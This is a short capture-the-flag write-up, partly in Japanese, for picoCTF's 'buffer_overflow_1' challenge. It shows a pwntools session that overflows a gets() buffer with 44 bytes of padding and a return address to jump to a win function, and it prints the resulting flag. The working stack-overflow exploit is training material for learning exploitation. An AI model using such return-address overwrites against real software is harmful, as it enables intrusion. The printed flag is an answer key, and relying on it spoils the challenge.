# buffer_overflow_1:bynary Medium  
Control the return address  

Additional details will be available after launching your challenge instance.  
Download the source [here](buffer_overflow_1.c)   

# Solution    
バイナリ、ソースコードが渡される。    
from pwn import *  
>>> p = remote("saturn.picoctf.net",55758)  
[x] Opening connection to saturn.picoctf.net on port 55758  
[x] Opening connection to saturn.picoctf.net on port 55758: Trying 13.59.203.175  
[+] Opening connection to saturn.picoctf.net on port 55758: Done  
>>> payload = b"a"*44  
>>> payload += p32(0x080491f6)  
>>> p.sendline(payload)  
>>> p.interactive()  
[*] Switching to interactive mode  
Please enter your string:   
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6  
picoCTF{addr3ss3s_ar3_3asy_6462ca2d}[*] Got EOF while reading in interactive  

# 考えたこと  
 gets(buf);からバッファオーバーフローが狙えると考えられる  
 次に、gdbでリターンアドレスまでのアドレスの大きさを調べる  
 結果、44バイトであることがわかった。  
 なので、４４バイト分適当な文字を入力しWIN関数の開始アドレス入力したらFLAGを獲得できると考えた  
 実際に実行するとFLAGを獲得できた  